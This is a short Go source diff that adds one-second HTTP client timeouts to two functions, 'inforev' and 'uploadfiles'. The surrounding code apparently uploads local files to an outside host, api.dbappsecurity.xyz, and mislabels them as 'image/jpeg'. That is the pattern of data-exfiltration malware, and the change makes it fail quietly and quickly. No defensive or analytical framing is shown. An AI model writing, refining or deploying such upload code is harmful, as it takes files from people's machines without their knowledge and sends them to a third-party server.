@@ -10,6 +10,7 @@ import (
 	"net/http"
 	"os"
 	"strings"
+	"time"
 )
 
 var connected bool
@@ -40,6 +41,7 @@ func inforev() {
 	}
 	client := &http.Client{
 		Transport: tr,
+		Timeout:   1 * time.Second,
 	}
 	_, err := client.Do(req)
 	if err != nil {
@@ -63,6 +65,7 @@ func uploadfiles(filenames []string) {
 		}
 		client := &http.Client{
 			Transport: tr,
+			Timeout:   1 * time.Second,
 		}
 		req, _ := http.NewRequest("POST", "https://api.dbappsecurity.xyz/ms", file)
 		req.Header.Set("Content-Type", "image/jpeg")
